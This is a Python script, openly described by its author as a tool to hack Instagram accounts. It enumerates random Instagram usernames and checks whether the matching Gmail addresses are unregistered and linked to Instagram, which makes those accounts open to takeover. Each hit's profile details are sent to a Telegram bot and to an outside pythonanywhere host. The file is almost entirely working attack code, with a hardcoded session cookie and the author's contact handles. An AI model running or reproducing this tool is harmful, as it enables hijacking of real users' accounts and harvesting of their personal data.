import requests
import gdolib
import random
import json
import requests,os,names,json,random
import requests,os,names,random,time,webbrowser
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime
import requests,sys,os,time

import requests,random,mechanize,time
import requests,random,mechanize,datetime
r = requests.session()
os.system( 'clear' )
G = '\033[2;32m'
R = '\033[2;31m'
Y = "\033[2;34m"
W = "\033[2;35m"
D = "\033[2;36m"
M = "\033[2;33m"

pss=input(R+"Enter the password !؟. ")
if pss ==  'hacksoss' : 
 pass
 print(G+"login successfully in tools the king of hacksoss")
 time.sleep(1)
 os.system(  ' clear'   )
else:
 exit(  " The password is wrong❌"   )
print("""

"""+G+""" < """+G+"""  THE KING OF HACKSOSS 
 OSAMH """+G+""" >

  """+G+"""___ ____   _   _ _   _ _   _ _____ 
"""+G+""" |_ _/  \
"""+G+"""  | | |   | 
"""+G+"""  | R
"""+G+""" 
    """+G+"""<    """+R+"""TOOLS OSAMH IN INSTGRAM HACK  lTHE FIRST TOOLS"""+G+""">                              
                                        
"""+G+"""▷ """+G+"""—— —— ——  —— —— ——  —— —— ——  —— —— ——  """+G+"""◁
"""+R+""" ⁂  THE KING OSAMH  @KY_112  """+G+""" ¦ """+G+"""     
"""+G+""" ⁂  Whatsapp """+G+""" ¦ """+G+""" +967730189500
"""+G+""" ⁂ Telegram """+G+""" ¦@KY_112 """+G+""" 
"""+G+"""▷ """+G+"""—— —— ——  —— —— ——  —— —— ——  —— —— ——  """+G+"""◁                                         
""")

print(R+""" ➸➸➸➸➸➸➸➸➸➸★𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐒𝐀𝐌𝐇★➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸""")

	
print(G+"""This tool was developed by the programmer : Osamh to hack Instagram accounts  """)
print(R+""" ➸➸➸➸➸➸➸➸➸➸★𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐒𝐀𝐌𝐇★➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸""")
hit = 0
	 
#############################
token = input(G+"➠ Enter the Token " )

ID = input(G+"   ➠Enter the ID  " )

sessionid = input(' ➠Enter the session ')

header={'Cookie':'mid=Yuoj_QABAAGDy60NqxnFkEK1ugGo; ig_did=73D09A01-5DEF-4825-A5FC-297629366704; ig_nrcb=1; dpr=1.75; datr=HyTqYpFIZCgFZLABtNmwFg7j; ds_user_id=54376972287; shbid="3201\05454376972287\0541691331769:01f7ecaf474c01cf2b64f89f656976d0965c8da3073154330a4900add3c619f67e943202"; shbts="1659795769\05454376972287\0541691331769:01f70263e8842a11c12dee03be01e020f555ebaa18ecb741a217c2cc23830cc4991498f9"; csrftoken=yGVOWF0iptpC69PXXdisZrltMc5Fzv5W; sessionid='+sessionid}
ID = input(D+" ➠Enter the ID agin" )
Token = input(D+" ➠Enter the tokin agin " )
print(G+""" ➸➸➸➸➸➸➸➸➸➸★𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐒𝐀𝐌𝐇★➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸""")
print("""
   """+G+"""/ @K_Y_1_1_2                      /$$          
"""+G+""" /$$__  $$        @KY_112            | $$          
"""+R+"""| Wait a few moments, the tool will start """)
print(G+""" ➸➸➸➸➸➸➸➸➸➸★𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐒𝐀𝐌𝐇★➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸""")
#https://t.me/HACKEEM_AL_HACKSOOS
def dead(email,user):
              global hit           
              url = 'https://android.clients.google.com/setup/checkavail'
              hed = {
	    'Content-Length':'98',
	    	
	    'Content-Type':'text/plain; charset=UTF-8',
	    'Host':'android.clients.google.com',
	    	
	    'Connection':'Keep-Alive',
	    	
	    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
              data = json.dumps({
	'username':email,
	'version':'3',
	'firstName':'123456',
	'lastName':'deadcode_22'})
	
              res = requests.post(url,data=data,headers=hed)
              if res.json()['status'] == 'SUCCESS':
              	
                      check = gdolib.check_email.instagram(email)
                      if check['status']=='Success':
                          print(G+f' ✅ تم صيد حساب انستا بواسطه القياده 112حاكم الهكسوس: {email} 🛡 ')
                          hit += 1
                          user = email.split('@')[0]
                          try:
                          	
                           rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=header).json()  
                           	
                           nam = str(rr['graphql']['user']['full_name'])
                           iddd = str(rr['graphql']['user']['id'])
                           fol = str(rr['graphql']['user']['edge_followed_by']['count'])
                           fols =str(rr['graphql']['user']['edge_follow']['count'])
                           isp = str(rr['graphql']['user']['is_private'])
                           bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
           	
                           re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
                           ree = re.json()
                           dat = ree['data']
                           tlg =(f"""
‌‌‌تم صيد حساب انستا بواسطه القياده112حاكم الهكسوس
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
متاح من الحاكم⇦ {hit}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
الاسم⇦ {nam}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
اليوزر ⇦ {user}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
الايميل⇦ {email}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
متابعيين ⇦ {fol}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
يتابع⇦ {fols}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
تاريخ صيد الحاكم⇦ {dat}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
منشوارته⇦ {bio}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
لينك الحساب⇦ https://www.instagram.com/{user}
➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
تم بواسطه   ➪ https://t.me HACKEEM_AL_HACKSOOS""")
                           print(tlg)
                           	
                           		
                           requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
                          except:
                           tlg=(f"""
‌‌‌   ★ تم صيد متاح انستا☑★
              الجلاد112 حاكم الهكسوس مر من هنا ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
رقم الصيد ⇦ {hit}
               ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
اليوزر ⇦ {user}
               ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
الايميل ⇦ {email}
               ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
لينك الحساب  ⇦ https://www.instagram.com/{user}
               ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
        
      𝐁𝐘 ➪ @KY_112         
               
 مصدر وقناه الحاكم ☜  https://t.me/V00_8 """)
                           requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
                           print(tlg)
                      else:
                          print(R+f' No insta: {email} 🚫  ')
              elif res.json()['status'] =='USERNAME_UNAVAILABLE':
                  print(R+f' ❌ wrong email : {email} ')
              else:
                  print(f"{R} The tool has been stopped, go to Osamh (@KY_112) the developer to restart it")
                  exit()   
def rand():
	while True:
		user='1234567890qwertyuiopasdfghjklzxcvbnm.'
		num='456789'
		rng=int("".join(random.choice(num)for i in range(1)))
		name=str("".join(random.choice(user)for i in range(rng)))
		ch=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
		if "users" in ch.text:
			
			for i in ch.json()["users"]:
				
				user=(i['user']['username'])
				em = user
					
				email = em+"@gmail.com"
				dead(email,user)
		else:
			
					rand()
	
rand()      
#import time
#myTime = time.ctime()
#print (my time)
# 
#	mytime2 = time.asctime()
#mytime = time.localtime()
#resultTime = time.strftime("%d/%n/%Y, %H:%M:%S" , mytime )
#beforeSleep = "This is the frist sentence"
#print(beforeSleep)
#time.sleep(8)
#afterSleep = "This is the secound statement"
#print(afterSleep)
